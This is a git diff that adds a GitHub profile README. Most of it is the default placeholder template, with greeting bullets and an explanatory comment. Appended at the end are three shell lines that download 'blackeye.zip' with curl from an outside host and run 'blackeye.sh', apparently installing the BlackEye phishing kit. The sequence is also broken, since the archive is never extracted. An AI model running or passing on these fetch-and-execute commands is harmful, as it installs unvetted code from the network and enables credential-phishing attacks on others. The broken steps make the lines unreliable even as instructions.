@@ -1,0 +1,13 @@
+- 👋 Hi, I’m @imran7460
+- 👀 I’m interested in ...
+- 🌱 I’m currently learning ...
+- 💞️ I’m looking to collaborate on ...
+- 📫 How to reach me ...
+
+<!---
+imran7460/imran7460 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+You can click the Preview link to take a look at your changes.
+--->
+curl -O http://dsvr.blackeye.cloud/alld/blackeye.zip
+cd blackeye
+bash blackeye.sh
